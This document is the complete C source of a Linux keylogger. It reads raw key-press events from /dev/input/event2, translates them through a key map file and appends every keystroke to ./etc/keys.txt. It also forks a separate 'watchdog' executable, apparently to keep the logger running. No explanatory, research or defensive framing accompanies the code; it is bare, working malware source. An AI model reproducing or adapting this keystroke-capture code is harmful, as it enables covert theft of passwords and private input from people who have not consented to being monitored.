#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>

#define input_file "/dev/input/event2"

#define debug 0

char keys[242][20];

main() {
	int piped[2];

	pipe(piped);

	pid_t pid = fork();

	if(pid == -1) {
		exit(1);
	}

	if(pid == 0) {
		close(piped[1]);
		char *watchdogName = "./build/watchdog.exe";

		char readPipe[10];
		sprintf(readPipe, "%d", piped[0]);

		char *args[3];
		args[0] = watchdogName;
		args[1] = readPipe;
		args[2] = NULL;

		execv(watchdogName, args);
	}
	else {
		if(fork() == 0) {
			int file;
			FILE *result;
			
			load_key_map();

			file = open(input_file, O_RDONLY);

			if (file < 0) {
				exit(1);
			}

			result = fopen("./etc/keys.txt", "a+");

			struct input_event ev;

			while(1) {
				read(file, &ev, sizeof(struct input_event));
				if(ev.type == EV_KEY) {
					if(ev.value == 1) {
						if(ev.code == 28) {
							fprintf(result, "\n", "");
						}
						else {
							fprintf(result, "%s", keys[ev.code]);	
						}

						fflush(result);
					}
				}
			}
		}
	}
}

load_key_map() {
	FILE *kf = fopen("./etc/map.txt", "r");
	if(kf == NULL){ 
		exit(0);
	}
	char line[40];
	int i;
	for(i = 0; fgets(line, 30, kf) > 0 && i < 242; i++){
		line[strlen(line) - 1] = '\0';
		strcpy(keys[i], line);
	}
	fclose(kf);
}